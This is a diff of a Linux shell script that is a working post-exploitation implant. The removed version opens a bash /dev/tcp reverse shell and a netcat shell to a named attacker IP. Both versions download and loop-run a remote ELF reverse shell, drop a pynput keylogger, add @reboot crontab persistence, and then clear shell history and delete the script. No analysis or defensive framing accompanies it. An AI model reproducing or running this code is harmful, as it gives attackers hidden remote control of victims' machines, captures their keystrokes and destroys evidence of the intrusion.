@@ -1,82 +1,66 @@
-#!/bin/bash
+#!/bin/sh
 
-# --- Disable history tracking ---
 unset HISTFILE
 HISTSIZE=0
 HISTFILESIZE=0
 set +o history 2>/dev/null
 
-# --- Configurable Variables ---
-ATTACKER_IP="172.16.17.39"
-ATTACKER_PORT_1="4444"   # For Bash reverse shell
-ATTACKER_PORT_2="5555"   # For Netcat shell
+# Config
+ATTACKER_HOST="172.16.17.39"
+ELF_URL="https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf"
 TMP_DIR="/tmp/.sysd"
-REVSHELL_BASH="$TMP_DIR/revshell.sh"
-REVSHELL_NC="$TMP_DIR/ncshell.sh"
-ELF_PAYLOAD="$TMP_DIR/shell.elf"
+ELF_PATH="$TMP_DIR/shell.elf"
+LOOP_SCRIPT="$TMP_DIR/loop.sh"
 KEYLOGGER="$TMP_DIR/keylogger.py"
+CRON_TMP="/tmp/.cronbk"
 
-# --- Create working directory ---
+# Create temp dir
 mkdir -p "$TMP_DIR"
 
-# --- Payload 1: Bash Reverse Shell ---
-cat > "$REVSHELL_BASH" <<EOF
-#!/bin/bash
-bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT_1 0>&1
-EOF
-chmod +x "$REVSHELL_BASH"
+# Download and run ELF reverse shell (looped)
+curl -s -o "$ELF_PATH" "$ELF_URL"
+chmod +x "$ELF_PATH"
 
-# --- Payload 2: Netcat Reverse Shell ---
-cat > "$REVSHELL_NC" <<EOF
-#!/bin/bash
+# Loop script to ensure reconnection
+cat > "$LOOP_SCRIPT" <<EOF
+#!/bin/sh
 while true; do
-  nc $ATTACKER_IP $ATTACKER_PORT_2 -e /bin/bash
+  "$ELF_PATH" >/dev/null 2>&1
   sleep 10
 done
 EOF
-chmod +x "$REVSHELL_NC"
+chmod +x "$LOOP_SCRIPT"
 
-# --- ELF Payload Download and Loop Execution ---
-curl -s -L https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf -o "$ELF_PAYLOAD"
-chmod +x "$ELF_PAYLOAD"
-
-cat > "$TMP_DIR/elf_loop.sh" <<EOF
-#!/bin/bash
-while true; do
-  "$ELF_PAYLOAD" >/dev/null 2>&1
-  sleep 5
-done
-EOF
-chmod +x "$TMP_DIR/elf_loop.sh"
-
-# --- Keylogger Python Script ---
+# Lightweight keylogger using pynput
 cat > "$KEYLOGGER" <<EOF
 from pynput import keyboard
-
 def on_press(key):
-    with open("/tmp/.sysd/keys.log", "a") as f:
-        f.write(str(key) + "\\n")
-
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+    try:
+        with open("$TMP_DIR/keys.log", "a") as f:
+            f.write(str(key) + "\\n")
+    except:
+        pass
+with keyboard.Listener(on_press=on_press) as l:
+    l.join()
 EOF
 
-# --- Add Persistence (via crontab) ---
-(crontab -l 2>/dev/null; echo "@reboot bash $REVSHELL_BASH &") | crontab -
-(crontab -l 2>/dev/null; echo "@reboot bash $REVSHELL_NC &") | crontab -
-(crontab -l 2>/dev/null; echo "@reboot bash $TMP_DIR/elf_loop.sh &") | crontab -
-(crontab -l 2>/dev/null; echo "@reboot python3 $KEYLOGGER &") | crontab -
+# Add persistence to crontab
+crontab -l 2>/dev/null > "\$CRON_TMP"
+echo "@reboot bash $LOOP_SCRIPT &" >> "\$CRON_TMP"
+echo "@reboot python3 $KEYLOGGER &" >> "\$CRON_TMP"
+crontab "\$CRON_TMP"
+rm -f "\$CRON_TMP"
 
-# --- Execute everything NOW ---
-bash "$REVSHELL_BASH" >/dev/null 2>&1 &
-bash "$REVSHELL_NC" >/dev/null 2>&1 &
-bash "$TMP_DIR/elf_loop.sh" >/dev/null 2>&1 &
+# Run immediately
+bash "$LOOP_SCRIPT" >/dev/null 2>&1 &
 python3 "$KEYLOGGER" >/dev/null 2>&1 &
 
-# --- Clean up command traces ---
+# Wipe bash & zsh history
 sleep 1
 rm -f ~/.bash_history ~/.zsh_history
 history -c 2>/dev/null
+
+# Self delete (script itself)
 [ -f "$0" ] && rm -- "$0"
 
 exit 0
